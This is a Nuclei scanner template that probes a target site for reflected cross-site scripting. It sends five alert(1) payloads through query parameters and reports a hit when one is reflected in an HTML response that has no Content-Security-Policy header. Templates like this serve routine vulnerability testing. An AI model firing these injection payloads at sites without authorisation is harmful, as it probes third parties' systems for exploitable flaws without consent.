id: K70n0s510-xss-godmode
info:
  name: XSS Polyglot God Mode
  author: K70n0s510
  severity: medium
  description: Attempts 5 diverse XSS contexts (Script, Attribute, Event, SVG, Markdown).
  tags: xss,polyglot
http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<script>alert(1)</script>"
      - "{{BaseURL}}/?search=<img src=x onerror=alert(1)>"
      - "{{BaseURL}}/?id=\" onmouseover=alert(1) \""
      - "{{BaseURL}}/?p=<svg/onload=alert(1)>"
      - "{{BaseURL}}/?val=javascript:alert(1)"

    matchers-condition: and
    matchers:
      - type: word
        name: payload-reflection
        part: body
        words:
          - "<script>alert(1)</script>"
          - "<img src=x onerror=alert(1)>"
          - "onmouseover=alert(1)"
          - "<svg/onload=alert(1)>"
      - type: word
        name: html-header
        part: header
        words: ["text/html"]
      - type: status
        status: [200]
      - type: word
        name: no-csp
        part: header
        words: ["Content-Security-Policy"]
        negative: true  # Only alert if there is NO CSP blocking us
